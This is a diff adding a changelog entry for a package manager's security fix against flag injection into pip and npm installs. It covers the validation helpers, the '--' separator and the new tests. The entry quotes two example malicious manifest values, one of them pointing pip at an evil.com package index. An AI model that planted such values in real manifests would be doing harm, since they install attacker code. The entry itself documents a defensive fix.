@@ -64,6 +64,26 @@ Multi-phase enterprise-grade enhancement program. All phases bundled into a sing
   - 17 unit tests for `_assert_sql_identifier` covering valid identifiers, nine injection patterns (statement breakage, predicate injection, quote breaks, etc.), non-string inputs, and `kind` reporting.
   - 7 integration tests through the public `call_stdlib('real_db_update'|'real_db_delete', ...)` dispatcher proving each historical exploit attempt now raises **and that no rows were mutated**, plus regression tests that the legitimate dict-WHERE and parameterised string-WHERE paths still work.
 
+### Phase 6 — Command injection hardening (pip/npm flag-injection)
+
+**Security fix.** Although `shell=True` was already eliminated in 9.2.0, the package-manager and interpreter still passed manifest/lockfile values into `pip install` and `npm install` as positional argv. `pip` and `npm` both parse flags from positional arguments — so a malicious manifest entry like `evil = "--extra-index-url https://evil.com/pypi"` or `version = "* --before-script=evil.sh"` would, before this release, silently install from an attacker-controlled source or run an attacker-chosen script. All four call sites are now closed.
+
+**Added**
+- `_normalize_python_requirement` (existing helper) now refuses any requirement that **starts with `-` or contains a whitespace-separated flag token**, and refuses `pkg @ url`-style URL/path install specs. Power users wanting URL installs call pip directly.
+- New `_validate_npm_version_spec(version)` in `epl/package_manager.py` — same flag-injection check for npm version specs read from `[js-dependencies]`.
+- **Defense in depth:** every `pip install`/`npm install` invocation now uses the `--` end-of-options separator so that even if validation were bypassed, the package manager would treat the requirement as positional rather than a flag.
+
+**Changed (breaking only for previously-exploitable code paths)**
+- `install_python_package`, `install_python_dependencies`, the lockfile install loop, **and the auto-install path in `epl/interpreter.py`** all now route through `_normalize_python_requirement` and emit `pip install --  <req>`.
+- `install_js_package` and `install_js_dependencies` now validate both the package name (already protected) and the version spec, and emit `npm install --  <target>`.
+
+**Tests**
+- 26 new tests in `tests/test_command_injection.py`:
+  - 12 unit tests for `_normalize_python_requirement` covering clean specifiers, six flag-injection payloads, and three URL/path-spec payloads.
+  - 12 unit tests for `_validate_npm_version_spec` covering valid semvers, five flag-injection payloads, and the non-string case.
+  - 2 end-to-end tests proving that a poisoned `epl.toml` is refused at the boundary and **the `subprocess` is never invoked**.
+- 3 existing tests updated to assert the new `--`-separated argv shape.
+
 ---
 
 ## [9.2.0] — 2026-06-01
